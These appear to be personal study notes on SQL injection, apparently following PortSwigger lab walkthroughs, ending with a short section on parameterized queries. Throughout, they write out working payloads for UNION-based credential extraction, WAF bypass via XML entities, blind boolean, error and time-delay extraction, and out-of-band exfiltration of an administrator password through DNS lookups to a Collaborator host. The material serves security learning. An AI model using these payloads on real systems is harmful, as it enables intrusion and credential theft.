## Definition
SQL injection (SQLi) is a web security vulnerability:
that allows an attacker to interfere with the queries that an application makes to its database.

## How to detect
- `'` -->  and look for errors or other anomalies
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses
- Boolean conditions such as `OR 1=1` and `OR 1=2`
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.

SQLi can be in:
- `UPDATE` statements -->  in the updated values or in `WHERE` clause
- `INSERT` statements -->  in the inserted values
- `SELECT` statements -->  in the table column name or in `ORDER BY`

## examples
<span style="background:#fff88f">example:</span>
this URL:
`https://insecure-website.com/products?category=Gifts`
cause this query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
=>
if we modify the URL with -->  `'--` 
`https://insecure-website.com/products?category=Gifts'--`
> [!info] 
> `--` -->  comment indicator in SQL

=>
the query becomes:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
=>
The query will display all the products (even products not released)

example:
- app for login
- you can enter username and password
- it does this query:
  `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
  =>
- you can login as admin by:
	- passing as username -->  `'--`
	- in this way the password check will be ignored 

## Cheat sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

## UNION
enables you to execute one or more additional `SELECT` queries and append the results to the original query
Example:
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
this query:
- returns a single result
- set with 2 columns
- containing:
	- values from columns `a` and `b` in `table1`
	- values from columns `c` and `d` in `table2`

<span style="background:#fff88f">2 requirements:</span>
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.
=>
for this attack you need to know:
- how many columns are being returned from the original query
- which columns returned from the original query are of a suitable data type to hold the results from the injected query

### Determining the number of columns required
2 ways:
#### ORDER BY
`' ORDER BY 1-- 
`' ORDER BY 2--` 
`' ORDER BY 3--` 
`etc.`
Send incrementing every time the query with the `ORDER BY`
=>
This series of payloads:
modifies ->   the original query to order the results by different columns in the result set

<span style="background:#fff88f">When the specified column index:</span>
<font color="#ff0000">exceeds</font> the number of actual columns in the result set -->   the DB returns an error
=>
you've found the n° of columns

#### NULL
`' UNION SELECT NULL-- 
`'` `UNION SELECT NULL,NULL--` 
`' UNION SELECT NULL,NULL,NULL--` 
`etc.`
If the n° of NULLs does not match the n° of columns =>  the DB returns an error

We use `NULL` as the values returned from the injected `SELECT` query:
bc:
- the data types in each column 
- must be compatible -->  between the original and the injected queries
and:
- `NULL` is convertible to every common data type

### Finding columns with a useful data type
- <span style="color:rgb(0, 186, 80)">we discovered the n° of columns</span>
- <span style="color:rgb(255, 0, 0)">we need to find columns with useful data type </span>-->  normally a string 
=>
you need to find one or more columns in the original query results:
whose data type is, or is compatible with -->   string data

how:
- you found for example that the query has 3 columns
=>
- for each of them substitute the NULL with a string
`' UNION SELECT 'a',NULL,NULL,NULL-- 
`' UNION SELECT NULL,'a',NULL,NULL--` 
`' UNION SELECT NULL,NULL,'a',NULL--`
=>
<span style="color:rgb(255, 0, 0)">if the query returns an error </span>=>  the column is not a string (or compatible type)
<span style="color:rgb(0, 186, 80)">otherwise  you found a string columns</span> 

### Retrieve interesting data
Now we can find useful data
=>
Suppose that:
- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`
=>
you can retrieve the `users` table contents with:
`SELECT username, password FROM users--`

<span style="color:rgb(255, 153, 0)">BUT:</span>
you need to know that there is a table called `users` and the 2 column names

### Retrieving multiple values within a single column
![[Pasted image 20240903171524.png]]possible string concatenation:
![[Pasted image 20240903172357.png]]

you can find it in -->  https://portswigger.net/web-security/sql-injection/cheat-sheet

### SQL injection with filter bypass via XML encoding
1. Observe that the stock check feature sends the `productId` and `storeId` to the application in XML format.
2. Send the `POST /product/stock` request to Burp Repeater.
3. In Burp Repeater, probe the `storeId` to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example:
   `<storeId>1+1</storeId>`
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
5. Try determining the number of columns returned by the original query by appending a `UNION SELECT` statement to the original store ID:
   `<storeId>1 UNION SELECT NULL</storeId>`
6. Observe that your request has been blocked due to being flagged as a potential attack.

**Bypass the WAF**
1. As you're injecting into XML, try obfuscating your payload using [XML entities](https://portswigger.net/web-security/xxe/xml-entities). One way to do this is using the [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension. Just highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec_entities/hex_entities**.

2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.


**Craft an exploit**
1. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns `0 units`, implying an error.
2. As you can only return one column, you need to concatenate the returned usernames and passwords, for example:
   `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
3. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a `~` character.
4. Use the administrator's credentials to log in and solve the lab


## Examining the database in SQLi attacks
To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
- The type and version of the database software
- The tables and columns that the database contains

<span style="background:#fff88f">how to find the database type:</span>
Microsoft, MySQL -->  `SELECT @@version`
Oracle -->  `SELECT * FROM v$version`
PostgreSQL -->  `SELECT version()`
=>
For example, you could use a `UNION` attack with the following input:
`' UNION SELECT @@version--`

if the query returns something like this =>  you know that in this case the DB is MySQL
![[Pasted image 20240903172828.png|300]]

### Querying the database type and version on Oracle
On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. 
If your `UNION SELECT` attack does not query from a table:
=>
you will still need to include the `FROM` keyword followed by a valid table name.
=>
There is a built-in table on Oracle called `dual`:
which you can use for this purpose. 
For example: 
`UNION SELECT 'abc' FROM dual`
=>
lab:
- find column n°: (there are 2)
  `' UNION SELECT NULL, NULL FROM dual`
- find which columns are string like (both)
  `' UNION SELECT 'a', 'a' FROM dual`
  =>
- find db version:
  `' UNION SELECT banner, 'a' FROM v$version--`
### Listing the contents of the database
you can query `information_schema.tables` -->  to list the tables in the database:
=>
`SELECT * FROM information_schema.tables`
This returns output like the following:
![[Pasted image 20240903174908.png|500]]

then:
you can find the column names with -->  `information_schema.columns`
=>
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
(you need to specify the table_name of the table that you want to find the columns)

example:
![[Pasted image 20240903175913.png]]
`?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--`
`?category=Lifestyle' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_rsrukv'--`
`?category=Lifestyle' UNION SELECT usename, passwd FROM pg_user--`

### Listing the database contents on Oracle
`' UNION SELECT NULL, NULL rom dual--`
`' UNION SELECT 'a', 'a' from dual--`
`' UNION SELECT table_name, 'a' from all_tables--`
`' UNION SELECT column_name, 'a' from all_tab_columns WHERE table_name='USERS_PEMHTR'--`
`' UNION SELECT USERNAME_RGPDEI, PASSWORD_AKDSIW from USERS_PEMHTR--`

## Blind SQL injection 
occurs when an application is vulnerable to SQL injection:
but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
=>
you can't relay on UNION attacks (bc you can't see the output)

### Triggering conditional responses
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed
=>
the app uses a SQL query to determine whether this is a known user:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query:
- is vulnerable to SQL injection
- but the results from the query are not returned to the user.
However: 
the app does behave differently -->  depending on whether the query returns any data
=>
If you submit a recognized `TrackingId`:
the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. 
You can retrieve information:
by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works:
suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
`…xyz' AND '1'='1 
`…xyz' AND '1'='2`
- The first of these values causes the query to return results
	- because the injected `AND '1'='1` condition is true. 
	- As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results
	- because the injected condition is false. 
	- The "Welcome back" message is not displayed
=>
This allows us to:
- determine the answer to any single injected condition
- extract data one piece at a time.

For example:
- suppose there is a table called `Users` with the columns `Username` and `Password`
- a user called `Administrator`
- You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
This returns the "Welcome back" message, indicating that:
- the injected condition is true
- so the first character of the password is greater than `m`

Next, we send the following input:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
This does not return the "Welcome back" message, indicating that:
- the injected condition is false
- so the first character of the password is not greater than `t`

Let's test if the first ch is `s`:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
"Welcome back" message => it's correct
=>
we proceed in this way for all the characters

#### Blind SQL injection with conditional responses
- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. 
- Modify the `TrackingId` cookie, changing it to:
  `TrackingId=...' AND '1'='1`
  Verify that the "Welcome back" message appears in the response.
- Now change it to:
  `TrackingId=xyz' AND '1'='2`
  Verify that the "Welcome back" message does not appear in the response. 
  This demonstrates how you can test a single boolean condition and infer the result.

- Now change it to:
  `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
  Verify that the condition is true, confirming that there is a table called `users`.

- Now change it to:
  `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
  Verify that the condition is true, confirming that there is a user called `administrator`.

- The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
  `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
   This condition should be true, confirming that the password is greater than 1 character in length.
    
- Send a series of follow-up values to test different password lengths. Send:
  `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
  Then send:
  `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`

- After determining the length of the password, the next step is to test the character at each position to determine its value. 
  This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
- In the Positions tab of Burp Intruder, change the value of the cookie to:
  `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
  This uses the `SUBSTRING()` function to:
	- extract a single character from the password
	- test it against a specific value. 
	- Our attack will cycle through each position and possible value
		- testing each one in turn
		
- Send the packet to Intruder
- Place payload position markers around the final `a` character in the cookie value and to the first `1`
  =>
  `TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`
- Attack type Cluster Bomb
- for param 1 set values as Number from 1 to 20
- for param 2 set values as simple list and select from the default list a-Z and 0-9
- we need to grep the Welcome back mex to identifying the correct characters
  =>
	- in Settings > Grep - Match > Clear All > add `Welcome back`
- start the attack
- filter by rows that contain the Welcome back mex

### Error-based 
where you're able to use error mex to either extract or infer sensitive data from the database

#### Triggering conditional errors
`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
These inputs:
- use the `CASE` keyword 
- to test a condition
- return a different expression depending on whether the expression is true:
	- With the 1 input:
	  the `CASE` expression evaluates to `'a'` -->  which does not cause any error.
	- With the 2 input:
	  it evaluates to `1/0` -->  which causes a divide-by-zero error

If the error causes a difference in the application's HTTP response:
=>
you can use this to determine whether the injected condition is true.
=>
Using this technique, you can retrieve data by testing one character at a time:
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

#### Blind SQL injection with conditional errors
- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie
- modify the cookie in this way -->  `TrackingId=xyz'`
	- verify that an error me is received
- modify to -->  ``TrackingId=xyz''``
	- Verify that the error disappears. 
	  This suggests that a syntax error is having a detectable effect on the response
- You now need to confirm that the server is interpreting the injection as a SQL query
- modify to -->  `TrackingId=xyz'||(SELECT '')||'`
	- the query still appears to be invalid =>  maybe the problem is the DB type
- try -->  ``TrackingId=xyz'||(SELECT '' FROM dual)||'``
	- we don't have the error =>  the db is oracle
- try to trigger the error with a fake table:
	- ``TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`` -->  we have the error
- test if the table `users` exists:
	- ``TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'``
		- no err => it exists
		  
- let's trigger the error using the condition that we saw before with `CASE` 
- `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
	- err
- `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
	- no err
- =>
  let's use this condition to test if the `administrator` user exists:
	- `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
		- err received => exists
- let's find password length
	- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
		- err receiver => password > 1
		- repeat until you don't have the err
		  =>
		  password is 20 ch
- let's find password ch
	- Send the packet to Intruder
	- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
	- Attack type Cluster Bomb
	- for param 1 set values as Number from 1 to 20
	- for param 2 set values as simple list and select from the default list a-Z and 0-9
- start the attack
- filter for status code -->  if 500 => there is the err =>  extract all the 500 status rows 

#### Extracting sensitive data via verbose SQL error messages
Misconfiguration of the DB sometimes results in verbose error messages
=>
These can provide information that may be useful to an attacker. 
For example, consider the following error message, 
which occurs after injecting a single quote into an `id` parameter:
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

This shows the full query that the application constructed using our input. 
We can see that in this case:
- we're injecting into a single-quoted string inside a `WHERE` statement. 
- This makes it easier to construct a valid query containing a malicious payload.
- Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. 
This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the `CAST()` function to achieve this:
- It enables you to convert one data type to another.
- For example, imagine a query containing the following statement:
  `CAST((SELECT example_column FROM example_table) AS int)`
- Often, the data that you're trying to read is a string. 
- Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:
  `ERROR: invalid input syntax for type integer: "Example data"`

This type of query may also be useful if a character limit prevents you from triggering conditional responses.

###### Visible error-based SQL injection
1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.
   `TrackingId=ogAZZfxtOKUELbuJ'`
4. In the response, notice the verbose error message. 
   This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. 
   Observe that your injection appears inside a single-quoted string.
5. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
   `TrackingId=ogAZZfxtOKUELbuJ'--`
6. Send the request. Confirm that you no longer receive an error. 
   This suggests that the query is now syntactically valid.
7. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:
   `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
8. Send the request. 
   Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
9. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:
   `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
10. Send the request. 
    Confirm that you no longer receive an error. 
    This suggests that this is a valid query again.
1. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:
   `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
12. Observe that you receive the initial error message again.
	Notice that your query now appears to be truncated due to a character limit. 
	As a result, the comment characters you added to fix up the query aren't included.
1. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
   `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
14. Notice that you receive a new error message, which appears to be generated by the database. 
    This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
15. Modify the query to return only one row:
    `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
16. Send the request. 
    Observe that the error message now leaks the first username from the `users` table:
    `ERROR: invalid input syntax for type integer: "administrator"`
17. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:
    `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
    ![[Pasted image 20240910115547.png]]
18. Log in as `administrator` using the stolen password to solve the lab

#### Triggering time delays
The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
`'; IF (1=2) WAITFOR DELAY '0:0:10'-- ' 
`;IF (1=1) WAITFOR DELAY '0:0:10'--`

- The first of these inputs does not trigger a delay -->   because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds -->  because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

##### Blind SQL injection with time delays
- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
- Modify the `TrackingId` cookie, changing it to:
  `TrackingId=x'||pg_sleep(10)--`
- Submit the request and observe that the application takes 10 seconds to respond

##### Blind SQL injection with time delays and information retrieval
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

### out-of-band (OAST) techniques
An application might carry out the same SQL query as the previous example but do it asynchronously. 
=>
- The app continues processing the user's request in the original thread
- and uses another thread to execute a SQL query using the tracking cookie. 
  =>
	- The query is still vulnerable to SQL injection
	- but none of the techniques described so far will work

Solution:
trigger out-of-band network interactions to a system that you control
=>
for example you can trigger `DNS`

The easiest and most reliable tool for using out-of-band techniques is [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator):
- server that provides custom implementations of various network services
- It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

This causes the database to perform a lookup for the following domain:
`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

Having confirmed a way to trigger out-of-band interactions
=>
you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
This input:
- reads the password for the `Administrator` user
- appends a unique Collaborator subdomain
- triggers a DNS lookup. 
- This lookup allows you to view the captured password:
  `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

#### Blind SQL injection with out-of-band interaction
- Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
- Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic [XXE](https://portswigger.net/web-security/xxe) techniques as follows:
  `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
- Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie

#### Blind SQL injection with out-of-band data exfiltration
1. Visit the front page of the shop, and use [Burp Suite Professional](https://portswigger.net/burp/pro) to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. 
   For example, you can combine SQL injection with basic [XXE](https://portswigger.net/web-security/xxe) techniques as follows:
   `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
4. Go to the Collaborator tab, and click "Poll now". 
   If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
5. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. 
   For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
6. In the browser, click "My account" to open the login page. 
   Use the password to log in as the `administrator` user

## Prevent SQLi
using prepared statements -->  parameterized queries instead of string concatenation
The following code is vulnerable to SQLi:
because the user input is concatenated directly into the query:
```JavaScript
String query = "SELECT * FROM products WHERE category = '"+ input + "'"; 
Statement statement = connection.createStatement(); 
ResultSet resultSet = statement.executeQuery(query);
```

You can rewrite this code in a way that prevents the user input from interfering with the query structure:
```JavaScript
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?"); 
statement.setString(1, input); 
ResultSet resultSet = statement.executeQuery();`
```

You can use parameterized queries:
- for any situation where untrusted input appears as data within the query, 
- including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement.